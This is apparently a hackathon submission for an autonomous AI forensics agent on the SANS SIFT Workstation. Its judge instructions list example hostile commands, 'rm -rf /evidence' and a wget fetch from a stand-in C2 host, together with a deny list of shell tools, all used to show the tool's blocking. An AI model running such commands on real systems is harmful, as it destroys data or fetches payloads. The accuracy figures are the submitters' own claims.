# SIFT-HUNTER — FIND EVIL! Devpost Submission (paste-ready)

Everything below is written to drop straight into the Devpost form, field by field.
Char limits noted where they apply.

---

## STEP 2 — PROJECT OVERVIEW

### Project name  (≤ 60 chars)
**SIFT-HUNTER — Self-Correcting Autonomous DFIR**   *(45 chars)*

Alternates:
- `SIFT-HUNTER — Autonomous AI Incident Response`  *(45)*
- `SIFT-HUNTER: The Forensic Analyst That Catches Itself`  *(54)*

### Elevator pitch  (≤ 200 chars)
**Autonomous AI incident response on the SANS SIFT Workstation. It triages disk and memory, maps MITRE ATT&CK, and catches its own hallucinations — self-correcting before they reach the report.**  *(~190 chars)*

Alternate:
- `An autonomous AI agent that does full digital forensics on the SANS SIFT Workstation — and catches its own hallucinations before they ever reach the incident report.`  *(~163)*

### Thumbnail
Use `devpost/thumbnail.png` (1200×800, 3:2). Edit thumbnail → upload that file.

---

## STEP 3 — PROJECT DETAILS (the "story")

### Inspiration
SANS framed the problem in two words: **Find Evil.** AI-powered attackers now compromise a
domain in under a minute, while a human analyst needs *hours* just to enumerate artifacts.
That's the "speed gap." But the moment you point an LLM at forensic evidence, a second
problem appears: it confidently **invents** findings — a file path, an IP, a hash that
isn't there. In incident response, a hallucinated indicator wastes hours of response time,
or worse, ends up in a report that goes to court. So the real challenge wasn't speed. It was
building autonomy you can **trust**. SIFT-HUNTER is our answer: an agent that hunts evil at
machine speed *and shows its work*.

### What it does
SIFT-HUNTER is an autonomous AI incident-response agent for the SANS SIFT Workstation. Point
it at disk and memory evidence and it runs the whole investigation itself:

- **Six specialist agents on LangGraph** — Triage → Disk Analyst → Memory Analyst →
  Correlator → **Verifier** → Reporter.
- **A custom MCP server** wrapping the SIFT forensic toolkit (MFTECmd, PECmd, RECmd, SBECmd,
  Sleuth Kit, Volatility3, plaso) — 8 disk + 5 memory tools behind one safe interface.
- **Detects** timestomping, LOLBin execution, registry persistence, process masquerading,
  C2 beacons, and credential dumping — across both disk and memory.
- **Maps every finding to MITRE ATT&CK** and enriches indicators via VirusTotal / AbuseIPDB.
- **Self-corrects** — a Verifier agent cross-checks every claim against raw tool output,
  flags hallucinations, and routes findings back to the analyst for re-examination.
- **Produces a structured incident report** with confidence levels and a complete
  finding-to-evidence **audit trail** (`sift-hunter audit <id>`).

On a real run against our benchmark incident it produced **6 findings, applied 7
self-corrections, and caught 4 hallucinations** — and the report shows the Verifier
*downgrading an over-claimed C2 attribution* to only what the evidence actually supports.

And we don't ask you to take our word for it. Evaluated against the **canonical
`zeus.vmem` and `cridex.vmem` memory samples** — the ones every DFIR analyst knows, with
publicly documented and cited ground truth — the deterministic detection layer scores
**100% precision / 86% recall / 0 false positives**, reproducible with no API key:
`python -m benchmarks.evaluate`.

### How we built it
- **Architecture = Pattern 2 + 3:** a custom **MCP server** (Pattern 2) exposes the forensic
  tools; a **LangGraph multi-agent orchestrator** (Pattern 3) drives them with a
  self-correction loop.
- **Security is architectural, not a prompt.** An ALLOWED/BLOCKED binary allowlist + path
  validation (no `..`, no symlink escape) + `shell=False`, all enforced in Python *before*
  the LLM runs anything. `rm`, `dd`, `wget`, `curl`, `bash` are structurally impossible —
  not "please don't."
- **Anti-hallucination engine:** a deterministic detector extracts IOCs (IPs, hashes,
  registry keys, executables) from each finding and checks they appear verbatim in raw tool
  output; the Verifier agent adds semantic review; flagged findings loop back (max 3) with
  correction context.
- **LLM-agnostic** — runs on Groq (free/fast) or Anthropic Claude.
- **Confidence discipline** — CONFIRMED requires 2+ independent sources; everything is
  labeled; uncertainty is made visible, never hidden.

### Challenges we ran into
- **LLMs hallucinate confidently.** String-matching reliably catches specific IOCs but
  misses semantic errors, so we layered three defenses (deterministic detector → LLM
  verifier → bounded correction loop) and *measured exactly* where each one succeeds and
  fails instead of hand-waving.
- **Trust requires reproducibility.** We refused to publish "trust us" accuracy numbers, so
  we built a deterministic, **no-API-key** benchmark that measures the detector at
  **93% catch / 0% false positives** and locked it in CI.
- **Safe but not crippled.** The allowlist had to permit every legitimate forensic flag
  while blocking everything dangerous.
- **A real end-to-end run found bugs mocked tests never could** (duplicate findings across
  correction loops, a broken total). We fixed them and re-ran clean — exactly the kind of
  honesty the system is built to enforce.

### Accomplishments that we're proud of
- **Measured accuracy on the samples every DFIR analyst knows.** On the canonical
  `zeus.vmem` and `cridex.vmem` images (published, cited ground truth): **100% precision,
  86% recall, 0 false positives** — reproducible with no API key. Evaluating on the real XP
  images even surfaced and fixed a process-lineage bug (it had assumed the post-Vista tree).
- **The self-correction visibly works on real evidence** — it caught itself over-attributing
  a Metasploit C2 finding and corrected it down to the confirmed facts.
- **93% hallucination-catch / 0% false positives**, and **20 guardrail-bypass attempts all
  refused** — both reproducible in one command, no key required.
- **244 tests**, all exercising the shipped code; a judge can run a full sample incident
  *and the entire accuracy evaluation* with **no SIFT Workstation and no API key**.

### What we learned
- For autonomous IR, **honesty beats confidence.** A system that says "I'm not sure, and
  here's exactly why" is more useful than one that's confidently wrong.
- **Architectural guardrails beat prompt guardrails** every single time.
- The only way to earn trust in an AI agent is to make its reasoning **auditable end to end**
  — from final finding back to the raw tool byte that produced it.

### What's next for SIFT-HUNTER
- Deeper memory forensics (malfind/injection, YARA scanning, timeline pivoting).
- A live streaming analyst UI that shows the self-correction loop firing in real time.
- A plug-in tool SDK so any SIFT tool can be added in under an hour.
- Role-specialized models per agent and an expanded benchmark suite (ransomware, APT
  anti-forensics).

### Built With  (tags)
`python` · `langgraph` · `model-context-protocol` · `anthropic-claude` · `groq` ·
`volatility3` · `mitre-att&ck` · `sans-sift` · `pydantic` · `pytest` · `click` · `rich` ·
`langchain`

---

## STEP 4 — ADDITIONAL INFO

### Source code
https://github.com/svaka2000/SIFT-HUNTER  *(public, MIT)*

### Demo video
*(paste YouTube link once recorded — script ready at `demo/demo_script.md`; the money shot
is the Verifier catching its own hallucination on the C2 finding.)*

### Try it out — instructions for judges (works without a SIFT Workstation)
```bash
git clone https://github.com/svaka2000/SIFT-HUNTER && cd SIFT-HUNTER && pip install -e .

# 1) Architectural security — no key needed
sift-hunter check "rm -rf /evidence"        # BLOCKED (destructive)
sift-hunter check "wget http://c2/payload"  # BLOCKED (network egress)
sift-hunter check "vol3 -f mem.dmp pslist"  # ALLOWED (read-only forensic tool)
pytest tests/test_security_bypass.py -v     # 20 bypass attempts, all refused

# 2) MEASURED accuracy on the canonical zeus.vmem + cridex.vmem samples — no key needed
python -m benchmarks.evaluate               # 100% precision / 86% recall / 0 FP

# 3) Reproduce the 93% hallucination-catch / 0% false-positive rate — no key needed
python -m benchmarks.hallucination_benchmark

# 4) Full sample incident through the detection engine — no key, no SIFT binaries
python -m benchmarks.detect_case benchmarks/cases/case001

# 5) Full autonomous agent run (needs GROQ_API_KEY or ANTHROPIC_API_KEY)
sift-hunter analyze benchmarks/cases/case001/evidence/*.csv
#    …or just read a real run: benchmarks/cases/case001/sample_report.md
```

### How it maps to the judging criteria
| Criterion | How SIFT-HUNTER addresses it |
|-----------|------------------------------|
| Autonomous execution | 6-agent LangGraph pipeline runs end-to-end from one command; the Verifier self-corrects with zero human input |
| IR accuracy | **Measured 100% precision / 86% recall / 0 FP on the canonical zeus.vmem + cridex.vmem samples** (docs/EVALUATION.md, reproducible no-key); confidence labels separate CONFIRMED from inferred |
| **Hallucination management** | Deterministic IOC detector + LLM verifier + correction loop — **measured 93% catch / 0% FP, reproducible** |
| Architectural guardrails | ALLOWED/BLOCKED allowlist + path validation + `shell=False`, enforced in Python, never by prompt — **tested for bypass (20 attempts refused)** |
| Audit trail | JSONL record of every tool call, finding, correction, transition — `sift-hunter audit <id>` traces any claim to raw evidence |
| Documentation | One-command install, ARCHITECTURE / SECURITY / EVALUATION / ADDING_TOOLS docs, 244 tests, new tool in < 1 hour |

---

## STEP 5 — SUBMIT
Before hitting submit, confirm: thumbnail uploaded, repo link live, demo video pasted,
"Built With" tags added, and the project marked complete.
